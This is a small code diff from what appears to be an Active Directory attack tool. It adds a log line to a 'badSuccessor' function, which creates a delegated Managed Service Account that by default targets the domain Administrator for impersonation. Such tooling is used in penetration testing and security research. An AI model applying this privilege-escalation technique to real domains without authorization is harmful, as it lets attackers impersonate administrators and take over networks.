@@ -108,6 +108,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     }
     conn.ldap.bloodyadd(dmsa_dn, attributes=attr)
     LOG.info(f"[+] DMSA {dmsa_sama} created in {ou}")
+    LOG.info(f"[+] DMSA {dmsa_sama} can now impersonate: {', '.join(t)}")
 
     client = None
     path = dmsa + "_" + "".join(
